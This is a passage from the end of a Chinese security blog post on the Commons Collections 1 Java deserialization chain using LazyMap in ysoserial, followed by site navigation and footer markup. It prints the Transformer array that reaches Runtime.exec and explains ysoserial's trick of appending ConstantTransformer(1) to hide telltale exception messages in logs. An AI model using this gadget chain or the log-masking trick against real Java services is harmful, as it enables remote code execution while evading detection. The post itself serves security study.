+<li>invoke-&gt;LazyMap#get<br>大概的一个流程就是这样。<h2 id="ysoserial的一些操作"><a href="#ysoserial的一些操作" class="headerlink" title="ysoserial的一些操作"></a>ysoserial的一些操作</h2>有时候调试上面的POC的时候会发现弹出了两个计算器，或者没有执行到readObject的时候就弹出了计算器。<br>这不是预期结果，但是原因是什么呢？<br>在代理了Map对象后，proxyMap调用任何方法都会触发payload弹出计算器。<br>所以本地代码调试的时候经常会调用什么toString之类的方法，不经意间触发payload。<br>在ysoserial中，它在poc的最后才将执行命令的Transformer数组设置到transformerChain中，<br>从而避免本地反序列化的过程中执行命令。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain</span><br></pre></td></tr></table></figure>
+而且ysoserial中的Transformer数组中最后增加了一个ConstantTransformer(1)<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">		<span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">		new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">			String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">			<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">		<span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">			Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">			<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">		<span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">			<span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">execArgs</span>),</span></span><br><span class="line"><span class="class">		<span class="title">new</span> <span class="title">ConstantTransformer</span>(1) &#125;</span>;</span><br></pre></td></tr></table></figure>
+可能是为了隐藏日常日志的一些信息。如果没有最后的这一个<code>ConstantTransformer(1)</code>是会看到异常中的特征。<br>如果增加了这个语句异常信息会由<br><code>java.lang.ProcessImpl cannot be cast to java.util.Set</code><br>变为<br><code>java.lang.Integer cannot be cast to java.util.Set</code></li>
+</ol>
+<h2 id="LazyMap与TransformedMap的对比"><a href="#LazyMap与TransformedMap的对比" class="headerlink" title="LazyMap与TransformedMap的对比"></a>LazyMap与TransformedMap的对比</h2><p>LazyMap仍然无法解决CommonCollections1这条利用链在高版本Java（8u71以后）中的使用问题。<br>LazyMap的漏洞触发完全没有setValue什么事，这也说明8u71后不能利用的原因和AnnotationInvocationHandler#readObject<br>中有没有setValue没任何关系（反驳某些文章不负责任的说法），关键还是和逻辑有关。<br>具体原因是不再直接使用反序列后得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/15/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CommonsCollections1-POC/" rel="next" title="Java安全漫谈-CommonsCollections1-POC">
+                <i class="fa fa-chevron-left"></i> Java安全漫谈-CommonsCollections1-POC
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ysoserial中的LazyMap是什么"><span class="nav-number">1.</span> <span class="nav-text">ysoserial中的LazyMap是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java代理"><span class="nav-number">2.</span> <span class="nav-text">Java代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用LazyMap构造利用链"><span class="nav-number">3.</span> <span class="nav-text">使用LazyMap构造利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单分析利用链"><span class="nav-number">4.</span> <span class="nav-text">简单分析利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ysoserial的一些操作"><span class="nav-number">5.</span> <span class="nav-text">ysoserial的一些操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LazyMap与TransformedMap的对比"><span class="nav-number">6.</span> <span class="nav-text">LazyMap与TransformedMap的对比</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">174.4k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
